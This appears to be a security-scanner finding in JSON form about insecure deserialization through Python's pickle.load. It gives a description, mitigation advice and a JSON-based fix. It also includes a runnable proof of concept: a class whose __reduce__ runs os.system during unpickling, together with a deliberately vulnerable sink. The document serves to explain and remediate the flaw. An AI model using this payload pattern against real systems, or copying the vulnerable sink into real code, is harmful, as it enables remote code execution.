            {
              "id": "e71b572d-95da-3d5f-889e-9cb4b40de582",
              "name": "## Description\n\nInsecure deserialization. In Python, calling pickle.load on data influenced by a user is dangerous because pickle is not a data-only format: it can recreate arbitrary Python objects and execute attacker-controlled code during loading.\n\nIn the shown sink, return pickle.load(user_input) trusts untrusted input as a serialized object stream. If an attacker controls the bytes read from user_input, they can trigger remote code execution, data tampering, or denial of service. The fix is to stop using pickle for untrusted data and switch to a safe serialization format such as JSON, then validate the parsed structure before returning it.\n\nIf the application must accept complex input, deserialize into basic types only and enforce an allowlist of expected fields and value types. Reserve pickle strictly for trusted, internal data that never crosses a security boundary and is protected from modification.\n\n## Mitigation Advice\n\nDo not use pickle, marshal, or shelve to deserialize data from requests, cookies, files uploaded by users, message queues, or any other untrusted source. Replace them with JSON or another data-only format and validate the result against a strict schema before use. In Python, this usually means parsing with json.load or json.loads and checking required fields, types, ranges, and allowed values.\n\nIf legacy code still depends on pickle, limit it to trusted local data only, protect that data against tampering, and isolate the operation as much as possible. Prefer explicit reconstruction of application objects from validated primitive values instead of automatic object deserialization.\n\n## Source Code Fix Recommendation\n\n~~~python\nimport json\nfrom typing import BinaryIO, Any\n\n\ndef load_user_data(user_input: BinaryIO) -> Any:\n    data = json.load(user_input)\n    if not isinstance(data, dict):\n        raise ValueError(\"Expected a JSON object\")\n\n    allowed_keys = {\"id\", \"name\", \"active\"}\n    if not set(data.keys()).issubset(allowed_keys):\n        raise ValueError(\"Unexpected fields in input\")\n\n    if \"id\" in data and not isinstance(data[\"id\"], int):\n        raise ValueError(\"Field 'id' must be an integer\")\n    if \"name\" in data and not isinstance(data[\"name\"], str):\n        raise ValueError(\"Field 'name' must be a string\")\n    if \"active\" in data and not isinstance(data[\"active\"], bool):\n        raise ValueError(\"Field 'active' must be a boolean\")\n\n    return data\n~~~\n\n## Library Dependencies\n\n~~~python\njson\ntyping\n~~~\n\n## References\n\n- [OWASP: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)\n- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)\n- [Python Documentation: pickle](https://docs.python.org/3/library/pickle.html)\n- [Python Documentation: json](https://docs.python.org/3/library/json.html)\n",
              "helpUri": "https://www.glog.ai/",
              "help": {
                "text": "",
                "markdown": "```python\n# app.py\nimport io\nimport os\nimport pickle\n\n\ndef load_user_data(user_input):\n    return pickle.load(user_input)\n\n\nclass Evil:\n    def __reduce__(self):\n        return (os.system, (\"echo VULNERABLE > pwned.txt\",))\n\n\ndef build_malicious_pickle():\n    payload = pickle.dumps(Evil())\n    return io.BytesIO(payload)\n\n\ndef main():\n    print(\"Building attacker-controlled pickle payload...\")\n    user_input = build_malicious_pickle()\n\n    print(\"Calling vulnerable sink: pickle.load(user_input)\")\n    result = load_user_data(user_input)\n\n    print(f\"Deserialization returned: {result}\")\n    if os.path.exists(\"pwned.txt\"):\n        with open(\"pwned.txt\", \"r\", encoding=\"utf-8\") as f:\n            print(\"Exploit succeeded, file contents:\")\n            print(f.read().strip())\n    else:\n        print(\"Exploit file not found\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n```toml\n# pyproject.toml\n[project]\nname = \"pickle-load-rce-demo\"\nversion = \"0.1.0\"\ndescription = \"Reproducible insecure deserialization example targeting pickle.load(user_input)\"\nrequires-python = \">=3.8\"\ndependencies = []\n```\n\n```bash\npython app.py\n```\n\nExpected effect:\n\n- The sink `return pickle.load(user_input)` deserializes attacker-controlled bytes.\n- During loading, `os.system(\"echo VULNERABLE > pwned.txt\")` executes.\n- A file named `pwned.txt` is created, demonstrating code execution.\n\nNotes:\n\n- Uses only Python standard library imports: `io`, `os`, `pickle`.\n- This is intentionally vulnerable for demonstration/testing only."
